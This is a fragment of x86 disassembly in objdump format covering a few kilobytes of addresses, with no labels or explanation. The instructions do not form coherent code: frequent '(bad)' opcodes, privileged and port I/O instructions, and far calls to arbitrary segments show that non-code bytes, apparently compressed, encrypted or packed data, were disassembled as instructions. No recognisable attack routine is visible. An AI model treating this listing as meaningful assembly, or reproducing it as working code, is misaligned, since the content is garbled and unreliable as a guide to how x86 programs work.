  40899a:	outs   dx,DWORD PTR ds:[esi]
  40899b:	call   0x5cef:0xc365f999
  4089a2:	xor    eax,0xe7444e87
  4089a7:	mov    edx,ebx
  4089a9:	scas   eax,DWORD PTR es:[edi]
  4089aa:	arpl   WORD PTR [ebx],bx
  4089ac:	mov    al,0xc7
  4089ae:	lock dec ecx
  4089b0:	add    dl,BYTE PTR [ebx-0x1b]
  4089b3:	fwait
  4089b4:	mov    BYTE PTR [edx],ah
  4089b6:	inc    edx
  4089b7:	add    DWORD PTR [esi],eax
  4089b9:	jl     0x408a2c
  4089bb:	jmp    0x40896a
  4089bd:	test   al,0x5b
  4089bf:	add    DWORD PTR [edx-0x38],esp
  4089c2:	(bad)  
  4089c3:	sub    BYTE PTR [eax+eiz*1+0x2ea9ab7d],0x3
  4089cb:	adc    eax,DWORD PTR [esi]
  4089cd:	xlat   BYTE PTR ds:[ebx]
  4089ce:	gs std 
  4089d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089d1:	cmc    
  4089d2:	(bad)  
  4089d3:	sbb    eax,0xa9cdc71c
  4089d8:	add    DWORD PTR [ecx-0x25],0xfffffff2
  4089dc:	icebp  
  4089dd:	cmp    BYTE PTR [esi-0x6b],cl
  4089e0:	data16 cli 
  4089e2:	mov    ecx,0x4e8b6f55
  4089e7:	(bad)  
  4089e8:	dec    esi
  4089e9:	mov    ds:0x9b26c541,al
  4089ee:	sti    
  4089ef:	pushf  
  4089f0:	sub    al,0x4
  4089f2:	xchg   esi,eax
  4089f3:	and    ch,BYTE PTR [edx-0x17da750d]
  4089f9:	mov    bh,0x57
  4089fb:	sbb    al,ch
  4089fd:	js     0x408a74
  4089ff:	dec    edi
  408a00:	push   0x1d
  408a02:	pop    esi
  408a03:	and    al,0x90
  408a05:	mov    eax,0x901489eb
  408a0a:	out    dx,eax
  408a0b:	lock mov DWORD PTR [edi+edi*1],ebx
  408a0f:	das    
  408a10:	mov    ah,0x33
  408a13:	sbb    ebp,0xa54d886e
  408a19:	jb     0x408a8b
  408a1b:	xor    al,BYTE PTR [edi-0x2d]
  408a1e:	dec    edx
  408a20:	fsubr  DWORD PTR [ebx+0x4efa38e8]
  408a26:	dec    esi
  408a27:	xor    DWORD PTR [eax+0x6a31bcb4],edi
  408a2d:	cmp    al,0xf5
  408a2f:	mov    al,0xab
  408a31:	retf   
  408a32:	add    eax,0xd03cdb55
  408a37:	cmp    BYTE PTR [edx],bl
  408a39:	clc    
  408a3a:	dec    ebp
  408a3b:	repz loop 0x4089ff
  408a3e:	test   eax,0xc935e340
  408a43:	sbb    esp,DWORD PTR ds:0x6f2085cd
  408a49:	call   0x811ac709
  408a4e:	mov    WORD PTR [ebx+0x75673162],?
  408a54:	cli    
  408a55:	jge    0x408a4a
  408a57:	pop    ss
  408a58:	sub    ebp,edx
  408a5a:	mov    ebp,0xeb2961ac
  408a5f:	push   0xd
  408a61:	adc    cl,dh
  408a63:	sbb    BYTE PTR [ebp-0x2f57e720],ah
  408a69:	rep lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a6c:	ins    DWORD PTR es:[edi],dx
  408a6d:	mov    DWORD PTR [ebx],esp
  408a6f:	lock cmp BYTE PTR [eiz*1-0x2e7f1f15],dh
  408a77:	loop   0x408a89
  408a79:	add    DWORD PTR [esi+edi*4-0x56],0x21241282
  408a81:	pushf  
  408a82:	and    ebx,ecx
  408a84:	mov    esi,0x29470d8b
  408a89:	jge    0x408aaa
  408a8b:	mov    al,0x96
  408a8d:	adc    ah,BYTE PTR [esi+0x643de1f8]
  408a93:	cmc    
  408a94:	pop    esi
  408a95:	sti    
  408a96:	jb     0x408aa7
  408a98:	push   esp
  408a99:	sbb    al,0xc5
  408a9c:	cmp    BYTE PTR [esp+ebp*4+0x3c],al
  408aa0:	dec    ebx
  408aa1:	add    DWORD PTR [edi+0x37f29ed1],ebp
  408aa7:	out    dx,al
  408aa8:	cmp    edx,edi
  408aaa:	sub    DWORD PTR [edi],esp
  408aac:	sub    ch,BYTE PTR ds:0x6ea26fe2
  408ab2:	sub    BYTE PTR [ebx],0xab
  408ab5:	addr16 mov dl,0xc6
  408ab8:	jle    0x408a62
  408aba:	je     0x408abb
  408abc:	out    dx,eax
  408abd:	adc    edi,0x29c9f3e0
  408ac3:	call   0x6343:0xf349bf57
  408aca:	xchg   esp,eax
  408acb:	retf   
  408acc:	pop    esi
  408acd:	test   al,0x5
  408acf:	mov    eax,0x2c7fff9a
  408ad4:	int    0x98
  408ad6:	dec    eax
  408ad7:	mov    BYTE PTR [edx+0xcb4089c],dl
  408add:	add    ebx,DWORD PTR [eax+0x77]
  408ae0:	mov    ebp,ebp
  408ae2:	loope  0x408ada
  408ae4:	out    dx,al
  408ae5:	je     0x408ac2
  408ae7:	int    0x9e
  408ae9:	inc    edi
  408aea:	push   ds
  408aeb:	mov    eax,ds:0xd21241db
  408af0:	or     DWORD PTR [edi-0x71],ebp
  408af3:	into   
  408af4:	nop
  408af5:	adc    eax,0xeab7fd4f
  408afa:	fmul   QWORD PTR [edi-0x22]
  408afd:	push   esp
  408afe:	xor    BYTE PTR [ebx+eiz*4-0x11],al
  408b02:	sub    bl,BYTE PTR [ebx+0x31]
  408b05:	stc    
  408b06:	xor    ecx,DWORD PTR [ecx+0x798aa2e5]
  408b0c:	test   DWORD PTR [edi],0x29e79686
  408b12:	or     ecx,DWORD PTR [edi+0x51]
  408b15:	sub    BYTE PTR [ebp-0x62bf11a2],ch
  408b1b:	mov    eax,0x5b670bb5
  408b20:	iret   
  408b21:	sub    ch,bl
  408b23:	inc    ebp
  408b24:	out    0x5,al
  408b26:	bound  edx,QWORD PTR [ebx]
  408b28:	ds inc eax
  408b2a:	pop    edi
  408b2b:	push   eax
  408b2c:	jbe    0x408ba8
  408b2e:	jb     0x408ab1
  408b30:	in     eax,0x81
  408b32:	xchg   ecx,eax
  408b33:	dec    ecx
  408b34:	psubq  mm4,QWORD PTR [esi-0x4b8ca6aa]
  408b3b:	dec    eax
  408b3c:	ja     0x408b61
  408b3e:	mov    bl,0xd4
  408b40:	mov    DWORD PTR [esi+edx*1-0x327471fe],edi
  408b47:	adc    al,BYTE PTR [edi+0x4a33f474]
  408b4d:	pop    ds
  408b4e:	pusha  
  408b4f:	jmp    0x3f832952
  408b54:	jno    0x408bb5
  408b56:	and    esp,DWORD PTR [esi-0x6e08d9cd]
  408b5c:	dec    esi
  408b5d:	jp     0x408b50
  408b5f:	stos   BYTE PTR es:[edi],al
  408b60:	cmp    dl,BYTE PTR [ebx-0x38]
  408b63:	fs push ebp
  408b65:	jns    0x408b95
  408b67:	or     DWORD PTR [ecx],esp
  408b69:	stos   DWORD PTR es:[edi],eax
  408b6a:	cld    
  408b6b:	cmp    cl,BYTE PTR [esi+0x392c7fc3]
  408b71:	arpl   WORD PTR [edi],bp
  408b73:	test   eax,0x7764a70e
  408b78:	pusha  
  408b79:	adc    ecx,DWORD PTR [esi-0x2a]
  408b7c:	or     ebp,DWORD PTR [esi+esi*1]
  408b7f:	push   DWORD PTR [ebx]
  408b81:	mov    ecx,0x217bf13e
  408b86:	scas   al,BYTE PTR es:[edi]
  408b87:	xchg   cl,dl
  408b89:	mov    BYTE PTR [esi],al
  408b8b:	inc    esi
  408b8c:	xchg   ebx,eax
  408b8d:	mov    BYTE PTR [esi+ecx*2+0x39019a51],bh
  408b94:	mov    esi,0xd40928d5
  408b99:	dec    eax
  408b9a:	imul   edx,DWORD PTR [edi+0x76],0x6c1ee7b
  408ba1:	in     al,dx
  408ba2:	jge    0x408c1e
  408ba4:	test   al,0x40
  408ba6:	xor    ebp,DWORD PTR [esi+0x25cf17d7]
  408bac:	mul    DWORD PTR [eax-0x795608b4]
  408bb2:	pop    ss
  408bb3:	mov    ah,0x8e
  408bb5:	sbb    BYTE PTR [ebp+0x2fca9e60],0x1c
  408bbc:	test   al,0x2c
  408bbe:	(bad)  
  408bbf:	jl     0x408be9
  408bc1:	mov    WORD PTR [edx-0x6a],fs
  408bc4:	hlt    
  408bc5:	std    
  408bc6:	rcl    BYTE PTR [ebp+0x540d218],0x8
  408bcd:	stos   BYTE PTR es:[edi],al
  408bce:	jmp    DWORD PTR [eax-0x7a0cf10c]
  408bd4:	jle    0x408be1
  408bd6:	jl     0x408c03
  408bd8:	fs mov cl,0x12
  408bdb:	dec    esp
  408bdc:	push   ecx
  408bdd:	push   edi
  408bde:	dec    esp
  408bdf:	(bad)  
  408be0:	enter  0x6d33,0x31
  408be4:	aad    0xba
  408be6:	adc    ah,BYTE PTR [esi-0x5c]
  408be9:	and    dh,BYTE PTR [edi+eax*4]
  408bec:	cld    
  408bed:	dec    esp
  408bee:	sub    al,0x30
  408bf0:	cmc    
  408bf1:	pusha  
  408bf2:	dec    ecx
  408bf3:	jmp    DWORD PTR [edi+0x67]
  408bf6:	push   eax
  408bf7:	jl     0x408c51
  408bf9:	or     eax,0xdfe2c869
  408bfe:	ins    BYTE PTR es:[edi],dx
  408bff:	mov    edi,0x404366c9
  408c04:	xchg   edi,eax
  408c05:	outs   dx,DWORD PTR ds:[esi]
  408c06:	inc    esi
  408c07:	ja     0x408c2e
  408c09:	popa   
  408c0a:	push   0x785e2680
  408c0f:	push   ss
  408c10:	or     DWORD PTR [edx+esi*2+0x1a],edx
  408c14:	stc    
  408c15:	sbb    BYTE PTR [edi],ch
  408c17:	(bad)  
  408c18:	dec    ecx
  408c19:	inc    edi
  408c1a:	xchg   DWORD PTR [eax+0x40],ebp
  408c1d:	es push edx
  408c1f:	retf   
  408c20:	or     BYTE PTR [ecx+edi*4+0x7d],al
  408c24:	outs   dx,BYTE PTR ds:[esi]
  408c25:	mov    esp,0xe48f229c
  408c2a:	mov    ds:0xe74e5730,al
  408c2f:	cld    
  408c30:	arpl   WORD PTR [edx],bx
  408c32:	cmc    
  408c33:	pop    ss
  408c34:	stos   DWORD PTR es:[edi],eax
  408c35:	add    BYTE PTR ds:0xb4e32a78,0x68
  408c3c:	sbb    DWORD PTR [edx],ebp
  408c3e:	test   eax,0xe05f4855
  408c43:	push   esp
  408c44:	in     eax,dx
  408c45:	mov    bl,BYTE PTR [ebx-0x351cc7d4]
  408c4b:	popa   
  408c4c:	xchg   ebp,eax
  408c4d:	pop    ss
  408c4e:	push   eax
  408c4f:	xor    BYTE PTR [esi-0x2c17bb76],0x24
  408c56:	mov    al,ds:0xe7c539fb
  408c5b:	sbb    bl,dh
  408c5d:	xchg   ecx,eax
  408c5e:	jo     0x408cb3
  408c60:	cs or  eax,0x83bf2bb2
  408c66:	js     0x408cc1
  408c68:	or     eax,0x19a7f778
  408c6d:	add    BYTE PTR [ecx-0x35],ch
  408c70:	and    al,0x6d
  408c72:	mov    BYTE PTR [ebp+0x71],bh
  408c75:	mov    BYTE PTR [edx-0x1cd28224],ch
  408c7b:	inc    esp
  408c7c:	push   esp
  408c7d:	sbb    BYTE PTR [ecx+0x16],cl
  408c80:	stc    
  408c81:	loope  0x408c5b
  408c83:	sub    al,0xb9
  408c85:	and    al,0x5f
  408c87:	push   ebp
  408c88:	mov    dl,0xca
  408c8a:	pusha  
  408c8b:	push   ecx
  408c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c8d:	call   0x500e:0x57b327b
  408c94:	imul   ecx,DWORD PTR ds:[esi+ecx*8],0xffffff83
  408c99:	mov    ebp,DWORD PTR [esi+0x3e512e0a]
  408c9f:	and    al,0x2a
  408ca1:	xor    BYTE PTR [edi-0x51],cl
  408ca4:	sbb    DWORD PTR [edx+eiz*2],esp
  408ca7:	sub    al,0x5c
  408ca9:	add    BYTE PTR [eax],al
  408cab:	adc    bh,BYTE PTR [edi+0x37]
  408cae:	jge    0x408c60
  408cb0:	inc    ebp
  408cb1:	das    
  408cb2:	mov    ecx,0x3aa4cc7
  408cb7:	cmc    
  408cb8:	cdq    
  408cb9:	mov    DWORD PTR [ecx+edi*1+0x1e],esp
  408cbd:	inc    ebp
  408cbe:	in     eax,0x91
  408cc0:	rcl    DWORD PTR [eax-0x5f8c5d18],cl
  408cc6:	test   al,0xb8
  408cc8:	pop    eax
  408cc9:	mov    BYTE PTR [eax-0x5b],bh
  408ccc:	dec    esp
  408ccd:	add    DWORD PTR [esi-0x5e],0xffffff9e
  408cd1:	xor    bl,ah
  408cd3:	rol    eax,cl
  408cd5:	fwait
  408cd6:	jnp    0x408cb0
  408cd8:	repz ds mov ebp,0x1b0ac794
  408cdf:	sbb    bh,BYTE PTR [eax-0x406d4d69]
  408ce5:	jnp    0x408d19
  408ce7:	jmp    0xe76022d9
  408cec:	sub    DWORD PTR [esi+0x67a0d3b9],0x64a5052b
  408cf6:	mov    WORD PTR [ebx+eiz*2+0x742a4dd8],gs
  408cfd:	push   cs
  408cfe:	in     al,0x7b
  408d00:	arpl   WORD PTR [ebx-0x405ff393],dx
  408d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d07:	popa   
  408d08:	test   BYTE PTR [edx-0x34],bl
  408d0b:	das    
  408d0c:	jp     0x408c91
  408d0e:	in     al,dx
  408d0f:	ret    0xa768
  408d12:	mov    cl,0x3b
  408d14:	or     edx,DWORD PTR [ebp-0x2d]
  408d17:	(bad)  [ebx+ebx*1+0xc]
  408d1b:	fwait
  408d1c:	retf   0x52bd
  408d1f:	pop    es
  408d20:	int3   
  408d21:	xchg   ecx,eax
  408d22:	jo     0x408d8e
  408d24:	xchg   BYTE PTR [ebp+0x404b4c22],al
  408d2a:	fist   DWORD PTR [ebp+0x68]
  408d2d:	sbb    ah,dh
  408d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d30:	push   0x2a7d29a8
  408d35:	iret   
  408d36:	inc    edi
  408d37:	shl    BYTE PTR [ebp-0x70],1
  408d3a:	rcl    BYTE PTR [ecx+0x146105b5],1
  408d40:	fmul   st,st(4)
  408d42:	xchg   esi,eax
  408d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d44:	push   edi
  408d45:	sbb    al,bh
  408d47:	mov    ebp,0x2b13a6d3
  408d4c:	repnz mov edx,0xa0fd059c
  408d52:	mov    dh,0xe2
  408d54:	add    al,BYTE PTR [esi+0x66]
  408d57:	push   ebx
  408d58:	adc    BYTE PTR [ebx+ebp*8-0x3b],bl
  408d5c:	lds    ecx,FWORD PTR [edx-0x1a]
  408d5f:	mov    ah,0x54
  408d61:	scas   eax,DWORD PTR es:[edi]
  408d62:	movnti DWORD PTR [ecx],edx
  408d65:	out    dx,al
  408d66:	cmp    al,0x25
  408d68:	fs jmp 0xad5f:0x8143d514
  408d70:	imul   esp,eax,0xffffffd9
  408d73:	scas   al,BYTE PTR es:[edi]
  408d74:	aad    0x58
  408d76:	imul   esi,DWORD PTR [eax],0x947fbe3d
  408d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d7d:	add    bl,BYTE PTR [ebx+0x6a]
  408d80:	adc    al,0x18
  408d82:	add    al,dl
  408d84:	ds mov edx,0xd17f76a8
  408d8a:	jecxz  0x408db9
  408d8c:	xchg   esi,eax
  408d8d:	pop    ds
  408d8e:	fmul   DWORD PTR [eax-0x5467c0e3]
  408d94:	lock inc esp
  408d96:	data16 aas 
  408d98:	or     ecx,DWORD PTR [eax]
  408d9a:	sub    BYTE PTR [edx],0xaf
  408d9d:	cmp    eax,0x3279c42
  408da2:	hlt    
  408da3:	add    edi,edi
  408da5:	enter  0xdf9e,0xf8
  408da9:	adc    al,0x5a
  408dab:	jnp    0x408e17
  408dad:	clc    
  408dae:	sub    al,0x54
  408db0:	ja     0x408d7b
  408db2:	clc    
  408db3:	gs dec edi
  408db5:	fsubr  QWORD PTR [edx-0x7d1788da]
  408dbb:	int3   
  408dbc:	daa    
  408dbd:	nop
  408dbe:	jmp    0x408dff
  408dc0:	fisttp QWORD PTR [ebx]
  408dc2:	inc    edi
  408dc3:	mov    eax,ds:0x782fbadf
  408dc8:	cmp    eax,0x8aa29566
  408dcd:	icebp  
  408dce:	stos   DWORD PTR es:[edi],eax
  408dcf:	test   al,0xf3
  408dd1:	sub    BYTE PTR [eax+0x6231bde3],bh
  408dd7:	out    dx,al
  408dd8:	dec    esi
  408dd9:	dec    ebp
  408dda:	div    ebx
  408ddc:	arpl   WORD PTR [ecx+0x53],sp
  408ddf:	pusha  
  408de0:	in     al,dx
  408de1:	icebp  
  408de2:	jo     0x408e5d
  408de4:	or     DWORD PTR [esi+0x77],edi
  408de7:	or     al,0x52
  408de9:	cmp    bl,BYTE PTR [ecx+0x5a]
  408dec:	hlt    
  408ded:	xlat   BYTE PTR ds:[ebx]
  408dee:	ret    
  408def:	leave  
  408df0:	inc    eax
  408df1:	dec    edi
  408df2:	ins    DWORD PTR es:[edi],dx
  408df3:	jb     0x408dfb
  408df5:	dec    ebp
  408df6:	xlat   BYTE PTR ds:[ebx]
  408df7:	adc    ch,BYTE PTR [eax]
  408df9:	test   BYTE PTR [esi-0x68657cbd],0x15
  408e00:	add    DWORD PTR [esi+0x5d0ca95c],esi
  408e06:	stos   BYTE PTR es:[edi],al
  408e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e08:	jb     0x408e36
  408e0a:	jb     0x408d8d
  408e0c:	rcr    BYTE PTR [edx+0x734cdda],cl
  408e12:	push   ds
  408e13:	dec    esp
  408e14:	jno    0x408e48
  408e16:	sbb    dl,BYTE PTR [eax-0x3440b85e]
  408e1c:	jbe    0x408e15
  408e1e:	push   0xffffff8e
  408e20:	call   0x6d37:0x37b0bd2b
  408e27:	mov    ecx,0xe36beecf
  408e2c:	loope  0x408e2e
  408e2e:	jmp    0x408e40
  408e30:	stos   DWORD PTR es:[edi],eax
  408e31:	mov    ds,WORD PTR [ebx]
  408e33:	jb     0x408e88
  408e35:	mov    BYTE PTR [ecx],ch
  408e37:	lahf   
  408e38:	mov    dh,BYTE PTR [ebp-0x70]
  408e3b:	aad    0x90
  408e3d:	imul   eax,edx,0xffffff9d
  408e40:	scas   eax,DWORD PTR es:[edi]
  408e41:	push   cs
  408e42:	dec    esi
  408e43:	mov    bh,0x6
  408e45:	and    dh,bl
  408e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e48:	mov    ebp,esp
  408e4a:	xor    al,0xe3
  408e4c:	iret   
  408e4d:	loop   0x408e33
  408e4f:	mov    ebp,0xa5ff043b
  408e54:	(bad)  
  408e55:	pusha  
  408e56:	jmp    0x408e84
  408e58:	pop    ebp
  408e59:	push   ds
  408e5a:	push   edi
  408e5b:	retf   
  408e5c:	mov    ebp,0x42b7f839
  408e61:	cmc    
  408e62:	adc    cl,BYTE PTR [ebx]
  408e64:	call   0xbf73b626
  408e69:	mov    ebx,DWORD PTR [ebx+0x3b]
  408e6c:	jp     0x408e04
  408e6e:	add    bl,dl
  408e70:	loope  0x408dfb
  408e72:	pop    ds
  408e73:	fild   WORD PTR [ecx+0x1c3fbc2b]
  408e79:	mov    cl,dl
  408e7b:	std    
  408e7c:	xchg   esp,eax
  408e7d:	dec    edi
  408e7e:	dec    ebp
  408e7f:	mov    eax,ds:0x1d68f69e
  408e84:	sub    edx,DWORD PTR [ebx]
  408e86:	fcomp  DWORD PTR [ecx+eax*2-0x1a]
  408e8a:	rcr    esp,1
  408e8c:	scas   eax,DWORD PTR es:[edi]
  408e8d:	aad    0xec
  408e8f:	outs   dx,DWORD PTR ds:[esi]
  408e90:	adc    eax,0x693d30e5
  408e95:	xor    ebx,esi
  408e97:	inc    eax
  408e98:	dec    eax
  408e99:	jmp    0xb89d:0x687d9a2
  408ea0:	push   ecx
  408ea1:	adc    al,0x47
  408ea3:	add    ch,ah
  408ea5:	test   DWORD PTR [edx+eiz*2],esi
  408ea8:	je     0x408efc
  408eaa:	dec    ebp
  408eab:	sysexit 
  408ead:	mov    cl,0x97
  408eaf:	jmp    0x408ecf
  408eb1:	(bad)  
  408eb2:	sti    
  408eb3:	loope  0x408eff
  408eb5:	or     ch,BYTE PTR [eax]
  408eb7:	sbb    ecx,ebx
  408eb9:	dec    esi
  408eba:	pop    ss
  408ebb:	(bad)  
  408ebc:	into   
  408ebd:	rcl    cl,cl
  408ebf:	shl    DWORD PTR [edx],0x56
  408ec2:	mov    eax,0x54b78c5e
  408ec7:	xor    cl,BYTE PTR [ebp-0x564af438]
  408ecd:	pop    ebp
  408ece:	inc    esi
  408ecf:	outs   dx,DWORD PTR ds:[esi]
  408ed0:	hlt    
  408ed1:	mov    bl,0x35
  408ed3:	sahf   
  408ed4:	enter  0x6e3,0x6f
  408ed8:	inc    ebx
  408ed9:	pop    ebp
  408eda:	mov    al,0x97
  408edc:	fisub  WORD PTR [edi-0x7a]
  408edf:	add    eax,0x25d0fab0
  408ee4:	xchg   eax,ebp
  408ee6:	nop
  408ee7:	imul   esp,ecx,0xffffffc8
  408eea:	mov    edx,0x156a8691
  408eef:	or     dl,dh
  408ef1:	cmp    DWORD PTR [ebx],0x7d6120f7
  408ef7:	clc    
  408ef8:	push   edx
  408ef9:	pop    edx
  408efa:	mov    cl,0xe9
  408efc:	jnp    0x408ed1
  408efe:	popa   
  408eff:	add    BYTE PTR [ecx],cl
  408f01:	or     BYTE PTR [ebp+0x75],bl
  408f04:	(bad)  
  408f05:	lea    ebx,es:[eax+0x21]
  408f09:	imul   eax,DWORD PTR [eax],0xffffffd3
  408f0c:	lds    esp,FWORD PTR [edx]
  408f0e:	es loopne 0x408f63
  408f11:	(bad)  
  408f13:	xchg   edi,eax
  408f14:	mov    esp,0xa02ac0cf
  408f19:	in     eax,dx
  408f1a:	test   al,0x5b
  408f1c:	fs xchg ecx,eax
  408f1e:	(bad)  
  408f20:	jmp    0x6711d906
  408f25:	inc    edx
  408f26:	leave  
  408f27:	and    DWORD PTR [eax],edi
  408f29:	lods   eax,DWORD PTR ds:[esi]
  408f2a:	neg    DWORD PTR [edx-0x31ffbffa]
  408f30:	jg     0x408f40
  408f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f33:	sub    dh,al
  408f35:	jnp    0x408f01
  408f37:	pop    edx
  408f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f39:	out    0xb6,al
  408f3b:	xor    dl,BYTE PTR [esp+edx*8+0x7c]
  408f3f:	dec    ebx
  408f40:	call   0x1d0f:0xa5777f54
  408f47:	fwait
  408f48:	les    ebp,FWORD PTR [ecx+0x7714253e]
  408f4e:	mov    dh,ch
  408f50:	push   edx
  408f51:	push   ecx
  408f52:	mov    edx,0x938ab3e0
  408f57:	inc    esp
  408f58:	mov    ah,0x87
  408f5a:	out    dx,eax
  408f5b:	fadd   QWORD PTR [edi]
  408f5d:	mov    fs,ebx
  408f5f:	(bad)
  408f62:	nop
  408f63:	mov    edx,0xdf440d2b
  408f68:	cwde   
  408f69:	or     al,0x57
  408f6b:	jge    0x408f63
  408f6d:	mov    ecx,0x79083310
  408f72:	mov    esi,0x589be89d
  408f77:	pop    esi
  408f78:	stos   DWORD PTR es:[edi],eax
  408f79:	xchg   ebx,eax
  408f7a:	test   ebx,ecx
  408f7c:	popa   
  408f7d:	loop   0x408fd0
  408f7f:	sbb    dl,BYTE PTR [esi]
  408f81:	mov    al,ds:0x5ca6e90e
  408f86:	mov    edx,0x38e35612
  408f8b:	out    dx,al
  408f8c:	bound  esp,QWORD PTR [ecx]
  408f8e:	add    DWORD PTR [ecx],0x13
  408f91:	add    al,0x5a
  408f93:	arpl   WORD PTR [ebp-0x7e],bp
  408f96:	pusha  
  408f97:	sbb    DWORD PTR [ebp+0x42],esp
  408f9a:	adc    ah,BYTE PTR [edx-0x2f6f8985]
  408fa0:	pop    edx
  408fa1:	jbe    0x408fa4
  408fa3:	popf   
  408fa4:	fcomi  st,st(1)
  408fa6:	mov    cl,0x13
  408fa8:	repz out 0x22,al
  408fab:	adc    esp,DWORD PTR [ebx+0x1d0c1c76]
  408fb1:	xor    BYTE PTR [ecx+0x3ea90db0],al
  408fb7:	xor    al,0xfa
  408fb9:	mov    dl,0xbf
  408fbb:	loopne 0x40903a
  408fbd:	mov    dh,0x9c
  408fbf:	push   edi
  408fc0:	add    DWORD PTR [eax-0x322d95b7],0x14
  408fc7:	ss into 
  408fc9:	inc    ebx
  408fca:	adc    DWORD PTR [ecx-0x74ea04d3],edx
  408fd0:	and    edx,DWORD PTR [edx+eax*4+0x95aadb3]
  408fd7:	stos   BYTE PTR es:[edi],al
  408fd8:	jg     0x408fba
  408fda:	ret    0x7881
  408fdd:	fisttp QWORD PTR [ebp-0x73]
  408fe0:	mov    DWORD PTR [edi+0xd67aefc],esp
  408fe6:	in     al,dx
  408fe7:	pop    es
  408fe8:	cmp    DWORD PTR [edx],0x1c
  408feb:	test   DWORD PTR [ecx-0x3ff94a3],eax
  408ff1:	int3   
  408ff2:	mov    edx,0x9a09dd58
  408ff7:	xchg   esp,eax
  408ff8:	das    
  408ff9:	mov    bl,0x7c
  408ffb:	dec    edi
  408ffc:	adc    eax,esp
  408ffe:	add    al,0xd9
  409000:	dec    eax
  409001:	out    0xa2,al
  409003:	pop    ebx
  409004:	fldcw  WORD PTR [ecx]
  409006:	xor    bh,bh
  409008:	fdiv   DWORD PTR [ebx+eax*8]
  40900b:	in     eax,0x7f
  40900d:	and    eax,0xd17da297
  409012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409013:	or     ch,ch
  409015:	lods   eax,DWORD PTR ds:[esi]
  409016:	loope  0x40901d
  409018:	pushf  
  409019:	lods   eax,DWORD PTR ds:[esi]
  40901a:	and    DWORD PTR [esi],edi
  40901c:	cmp    esi,0x17abcb61
  409022:	sbb    ebx,0x58
  409025:	adc    al,0xfc
  409027:	cmp    ebp,DWORD PTR [edx]
  409029:	clc    
  40902a:	jbe    0x408fc7
  40902c:	nop
  40902d:	fidiv  DWORD PTR [ebx-0x27518c24]
  409033:	inc    edi
  409034:	iret   
  409035:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409037:	xchg   BYTE PTR ds:0xc59b22e4,cl
  40903d:	sub    BYTE PTR fs:[eax-0x3c],al
  409041:	cs ds fcmovne st,st(3)
  409045:	(bad)  
  409046:	and    eax,0x6cfe3478
  40904b:	xchg   esi,eax
  40904c:	sbb    dl,BYTE PTR [edx+0x5b8a62ab]
  409052:	dec    edi
  409053:	xchg   edx,eax
  409054:	cmp    BYTE PTR [edi-0x5b],al
  409057:	jbe    0x409076
  409059:	jmp    0xa66eb1e2
  40905e:	jb     0x409061
  409060:	adc    eax,0xff90723d
  409065:	imul   ebx,esp,0x31
  409068:	dec    edi
  409069:	mov    dh,0xa1
  40906b:	mov    al,ds:0xadcf29d2
  409070:	mov    bl,0x22
  409072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409074:	(bad)  
  409075:	ja     0x4090c0
  409077:	push   edi
  409078:	add    al,0x66
  40907a:	popf   
  40907b:	test   al,0x6f
  40907d:	xor    BYTE PTR [eax],cl
  40907f:	xchg   edi,eax
  409080:	js     0x4090ae
  409082:	retf   0xf8d2
  409085:	icebp  
  409086:	xchg   ecx,eax
  409087:	push   es
  409088:	cmp    eax,0x4c8c193
  40908d:	aaa    
  40908e:	pop    ds
  40908f:	xor    ch,cl
  409091:	sub    al,0xb6
  409093:	dec    ebx
  409094:	dec    ecx
  409095:	pop    eax
  409096:	dec    eax
  409097:	cmp    eax,0x8cea48f4
  40909c:	test   al,0x1b
  40909e:	ret    0x8ac8
  4090a1:	fcom   QWORD PTR gs:[ecx+ebx*8-0x28a42441]
  4090a9:	mov    al,ds:0xde899b09
  4090ae:	mov    esi,DWORD PTR [ebx+0x6e]
  4090b1:	mov    edi,0x4a70f8ce
  4090b6:	scas   al,BYTE PTR es:[edi]
  4090b7:	jecxz  0x4090b2
  4090b9:	sub    BYTE PTR [ecx+0x31],dl
  4090bc:	sbb    eax,DWORD PTR [ebx]
  4090be:	mov    esp,0x65c40eb4
  4090c3:	aas    
  4090c4:	arpl   di,ax
  4090c6:	test   al,0x85
  4090c8:	adc    DWORD PTR [edi],edx
  4090ca:	sahf   
  4090cb:	ss inc eax
  4090cd:	ins    BYTE PTR es:[edi],dx
  4090ce:	adc    cl,BYTE PTR [eax+eax*8]
  4090d1:	int    0x64
  4090d3:	imul   eax,DWORD PTR [edi-0x13],0x16
  4090d7:	mov    BYTE PTR [ecx],al
  4090d9:	pop    ebx
  4090da:	sub    DWORD PTR [esi+0x63],edx
  4090dd:	aaa    
  4090de:	dec    edi
  4090df:	lea    esi,gs:[edi+0x4a]
  4090e3:	jecxz  0x4090cc
  4090e5:	mov    esi,0xc2338b9b
  4090ea:	pop    ebx
  4090eb:	adc    edi,edi
  4090ed:	retf   0x7c34
  4090f0:	imul   edx,esi,0xffffff9b
  4090f3:	mov    ebx,0x18f0ce59
  4090f8:	pop    esi
  4090f9:	jle    0x409106
  4090fb:	test   dh,0x2e
  4090fe:	(bad)  
  4090ff:	ins    DWORD PTR es:[edi],dx
  409100:	pop    ss
  409101:	stos   BYTE PTR es:[edi],al
  409102:	inc    esp
  409103:	sub    DWORD PTR [ebx+0x6d],eax
  409106:	adc    eax,0xc883dd16
  40910b:	dec    edi
  40910c:	cmp    eax,0xd0ef71cc
  409111:	test   bl,ah
  409113:	pop    ebp
  409114:	xor    ebp,esi
  409116:	sbb    DWORD PTR ds:0x34b0a0a7,esi
  40911c:	ds push esi
  40911e:	int3   
  40911f:	mov    al,ds:0xfb94167a
  409124:	add    ebp,eax
  409126:	cmp    al,BYTE PTR [eax+0x14026de8]
  40912c:	clc    
  40912d:	arpl   ax,di
  40912f:	xor    BYTE PTR [esi],al
